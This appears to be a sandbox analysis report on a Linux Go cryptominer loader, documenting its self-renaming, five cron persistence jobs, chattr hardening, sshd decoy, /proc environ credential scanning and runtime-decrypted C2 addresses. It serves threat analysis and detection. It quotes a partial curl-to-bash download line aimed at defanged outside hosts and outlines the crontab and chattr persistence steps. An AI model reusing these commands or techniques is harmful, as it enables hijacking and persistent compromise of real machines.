> **Verdict: malicious** · Family **getingminer** (suspected) · Confidence **low**
> 
> Aliases: GetingMiner, black3 miner, Go-based Linux cryptominer loader
> 
> The sample is a UPX-packed x86-64 Go ELF. In an isolated instance the following was actually observed at runtime: it renames/copies itself to /tmp/<random 8 chars>/db9ad809, writes a 241-byte curl|bash download script .c, builds and submits 5 cron scheduled tasks, calls chattr -i/+i to protect its own files, uses pgrep to probe the two process names c98157ac/cache, and launches /usr/bin/sshd as a decoy; at runtime two download addresses are decrypted in memory (195[.]24[.]237[.]240 and digital[.]digitaldatainsights[.]org's /.x/black3). The behavior aims at persistence and delivering a mining/download script, judged malicious.

## Behavior analysis

**10** behaviors in total, each with attached evidence; **1** is obtainable statically and **9** were obtained through dynamic analysis.

### 1. Self-copy and rename persistence

`T1036.005` · Confidence **high** · Dynamic

After starting, it renames its own run directory to /tmp/<8-char random name>, renames prog to db9ad809 in the same directory (768576 bytes, the same length as the original sample), and writes the two random names (c98157ac, db9ad809) into a cache file for reuse by cached name later.

> **Evidence**: syscall trace: renameat("/tmp/det.96v5og"→"/tmp/3f58eff0"), renameat("prog"→"db9ad809"), then read yields "c98157ac\ndb9ad809"; fsize 768576 matches the original sample.
> 
> **Source**: `ref:3b6d78afb2` · `ref:b7ca245d3b`

### 2. Write downloader script

`T1105` · Confidence **high** · Dynamic

In its own directory it creates a 241-byte executable script .c whose content curls 195[.]24[.]237[.]240/.x/black3, falls back to digital[.]digitaldatainsights[.]org/.x/black3 on failure, and pipes it to bash for execution.

> **Evidence**: syscall trace: openat("/tmp/3f58eff0/.c", O_RDWR|O_CREAT|O_TRUNC), fchmodat(0777), write(3,"#!/bin/bash\nif curl -s --connect-timeout 15 195.24.237[.]240/.x/black3; then ...", 241).
> 
> **Source**: `ref:3a58271338` · `ref:54d1eb9ec8`

### 3. Install five cron persistence jobs

`T1053.003` · Confidence **high** · Dynamic

Through bash -c it generates 5 cron records and pipes them to crontab -, covering boot, daily, every minute, monthly and every 30 minutes execution of its own copy or the .c script; these 5 records are visible in the isolated instance's user crontab.

> **Evidence**: syscall trace: execve("/usr/bin/bash", ["bash","-c","echo '@daily ...@reboot ...* * * * * ...@monthly ...*/30 ...' | crontab -"]), execve("/usr/bin/crontab", ["crontab","-"]); afterwards crontab -l outputs 5 /tmp/<random name> tasks.
> 
> **Source**: `ref:3b6d78afb2` · `ref:765d7e83ea`

### 4. chattr file attribute hardening

`T1222.002` · Confidence **high** · Dynamic

It first tries chattr -i on its own copy to remove the immutable attribute, then chattr +i on db9ad809 and c98157ac; as a non-privileged user some operations return Operation not permitted, but the call chain is complete.

> **Evidence**: execve("/usr/bin/chattr", ["chattr","-i","/tmp/.../prog"]), ["chattr","+i","/tmp/.../db9ad809"], ["chattr","+i","/tmp/.../c98157ac"]; stderr shows "chattr: Operation not permitted while setting flags on .../db9ad809".
> 
> **Source**: `ref:b7ca245d3b` · `ref:3a58271338`

### 5. Probe and spoof process names

`T1057` · Confidence **high** · Dynamic

It repeatedly runs pgrep -x c98157ac and pgrep -x cache to determine whether daemon/miner processes with the same names are alive, and prints "Process ... is not running." to stdout, as a state check for subsequently launching same-named processes.

> **Evidence**: execve("/usr/bin/pgrep", ["pgrep","-x","c98157ac"]) twice, ["pgrep","-x","cache"] once; stdout shows "Process c98157ac is not running." and "Process cache is not running.".
> 
> **Source**: `ref:b7ca245d3b` · `ref:9e71566815`

### 6. Launch sshd decoy

`T1036` · Confidence **high** · Dynamic

After the process checks it directly executes /usr/bin/sshd, masquerading its own activity as the system SSH service; the in-memory string explicitly says "checkingpid: launching /usr/bin/sshd decoy".

> **Evidence**: execve("/usr/bin/sshd", ["/usr/bin/sshd"]); runtime memory string "checkingpid: launching /usr/bin/sshd decoy".
> 
> **Source**: `ref:b7ca245d3b` · `ref:765d7e83ea`

### 7. Runtime decryption of download addresses

`T1027` · Confidence **high** · Dynamic

The outer layer is UPX-compressed and the inner Go program decrypts strings at runtime (main.decFunc exists, pclntab is unparsable); after the sample runs, two curl download commands and domain strings can be read in memory.

> **Evidence**: static: overall entropy 8.0, section table stripped, .gopclntab has no standard magic; dynamic: runtime heap memory dumps contain "curl -s ... 195.24.237[.]240/.x/black3" and "digital[.]digitaldatainsights[.]org".
> 
> **Source**: `ref:aeb14ab9a3` · `ref:9529431eaa` · `ref:54d1eb9ec8` · `ref:8ea3764f9a`

### 8. Masquerade as apt and cache files

`T1036.005` · Confidence **high** · Dynamic

In /tmp, /var/tmp, /dev/shm and the user home's cache/config directories it accesses or creates hidden files named .apt-cache.log, .apt-state.log, .dpkg-lock, .apt-lists, .dpkg-status, .apt-history and .sysconfig, disguised as package-management and font-cache data.

> **Evidence**: openat events: /tmp/.apt-cache.log, /var/tmp/.apt-state.log, /dev/shm/.dpkg-lock, %HOME%/.cache/.apt-lists, %HOME%/.config/.apt-history, %HOME%/.cache/fontconfig/.sysconfig, etc.
> 
> **Source**: `ref:765d7e83ea` · `ref:847da66dea`

### 9. Scan process environment variables

`T1552` · Confidence **high** · Dynamic

It traverses environ files of many PIDs under /proc (including PID 1 and system service processes), to collect credentials/cloud keys from environment variables or to judge the host environment.

> **Evidence**: openat events: /proc/1/environ, /proc/23/environ, /proc/24/environ, /proc/25/environ, /proc/253/environ etc. accessed in sequence; openat("/proc") first, then read one by one.
> 
> **Source**: `ref:847da66dea` · `ref:c5f2da662e`

### 10. Reserved mining launch path

`T1496` · Confidence **medium** · Static

The code contains mining deployment logic such as startMiner, getingmineru and writeCronJobs; this run had no external network, so the black3 source file was not obtained, the log shows "getingmineru: no source file found", and no real miner process was observed.

> **Evidence**: runtime decrypted strings: "startMiner: Start failed: %v", "getingmineru: no source file found", "getingmineru: chattr +i applied", "writeCronJobs: crontab updated (%d jobs)".
> 
> **Source**: `ref:765d7e83ea` · `ref:54d1eb9ec8`

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; please note when citing this report.

- Do not judge it as ransomware or a wiper: no file encryption, mass deletion or partition destruction was observed; the sample aims at persistence and mining delivery.
- Do not claim a real C2 session was completed or black3 was downloaded: there is no AF_INET connect/HTTP request in the network namespace; both URLs were recovered only from runtime-decrypted memory and the written script.
- Do not claim cron was successfully written in the current non-privileged context: crontab - showed Permission denied; the 5 tasks visible in the instance only show that this persistence action holds when the corresponding permissions are available.
- Do not treat the flag-like string matched in static ciphertext data as the answer: the string lies in high-entropy encrypted data and is a random false positive; the program accepts no input.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | Yes (stage2 `6aaba480dc41c3f665355b22daadd35fa6ed8d4cbdfc418ce68c107325b1a785`) |

**Limitations and pending verification**

1. The analysis instance's network was isolated and the sample made no AF_INET connection; both C2s were recovered only from runtime-decrypted memory and the on-disk script; black3's content and the final pool/wallet are unknown, and C2 reachability and sessions are unverified.
2. The sample ran as a non-privileged user; crontab - and chattr +i returned Permission denied; the full effect of persistence under root or an environment with corresponding permissions needs separate evaluation.
3. The inner Go binary's .gopclntab has no obvious magic and function names are missing; the family naming lacks public-intelligence support; getingminer is only a candidate based on the sample's self-identification and needs multi-engine/YARA review.
4. No real miner process or pool connection was observed; the startMiner path is an inference at the code and string level.
5. Static string scanning hit one flag-like string in high-entropy compressed data; it is a false positive and not used as a conclusion.
